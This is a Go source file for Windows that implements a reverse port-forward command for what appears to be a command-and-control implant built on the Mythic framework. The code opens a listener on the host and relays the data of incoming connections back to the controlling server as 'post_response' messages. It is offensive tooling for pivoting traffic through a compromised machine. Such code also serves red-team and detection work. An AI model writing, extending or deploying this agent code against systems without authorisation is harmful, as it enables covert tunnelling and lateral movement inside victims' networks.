//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
)

type RportFwd struct {
	mu        sync.Mutex
	ID        int
	BindAddr  string
	RemotePort int
	Listener  net.Listener
	Running   bool
	StopChan  chan struct{}
	Conns     map[int]net.Conn
	nextID    int
}

type RportfwdParams struct {
	Action     string `json:"action"`
	LocalPort  int    `json:"local_port"`
	BindAddr   string `json:"bindaddr"`
	RemotePort int    `json:"remote_port"`
}

func cmdRportfwd(raw json.RawMessage, a *Agent) string {
	var p RportfwdParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	switch p.Action {
	case "start":
		id := p.LocalPort
		if _, exists := a.Rportfwds[id]; exists {
			return fmt.Sprintf("rportfwd on port %d already running", id)
		}

		bindAddr := p.BindAddr
		if bindAddr == "" {
			bindAddr = "0.0.0.0"
		}

		rp := &RportFwd{
			ID:         id,
			BindAddr:   fmt.Sprintf("%s:%d", bindAddr, p.LocalPort),
			RemotePort: p.RemotePort,
			StopChan:   make(chan struct{}),
			Conns:      make(map[int]net.Conn),
		}
		a.Rportfwds[id] = rp
		go rp.Start(a)
		return fmt.Sprintf("rportfwd started: %s -> remote port %d", rp.BindAddr, p.RemotePort)

	case "stop":
		rp, exists := a.Rportfwds[p.LocalPort]
		if !exists {
			return fmt.Sprintf("no rportfwd on port %d", p.LocalPort)
		}
		close(rp.StopChan)
		if rp.Listener != nil {
			rp.Listener.Close()
		}
		for _, conn := range rp.Conns {
			conn.Close()
		}
		rp.Running = false
		delete(a.Rportfwds, p.LocalPort)
		return fmt.Sprintf("rportfwd on port %d stopped", p.LocalPort)

	default:
		return "unknown action (use start/stop)"
	}
}

func (r *RportFwd) Start(a *Agent) {
	r.Running = true

	listener, err := net.Listen("tcp", r.BindAddr)
	if err != nil {
		return
	}
	r.Listener = listener

	go func() {
		<-r.StopChan
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			break
		}

		id := r.nextID
		r.nextID++
		r.mu.Lock()
		r.Conns[id] = conn
		r.mu.Unlock()

		go r.handleConn(id, conn, a)
	}
}

func (r *RportFwd) handleConn(id int, conn net.Conn, a *Agent) {
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			r.mu.Lock()
			delete(r.Conns, id)
			r.mu.Unlock()
			conn.Close()
			return
		}

		data := map[string]interface{}{
			"action":      "rportfwd",
			"port":        r.RemotePort,
			"connection":  id,
			"data":        string(buf[:n]),
		}
		resp := MythicResponse{
			Action:     "post_response",
			UUID:       a.UUID,
			UserOutput: "",
			Completed:  true,
		}
		jsonData, _ := json.Marshal(data)
		resp.UserOutput = string(jsonData)
		a.postResponse(resp)
	}
}
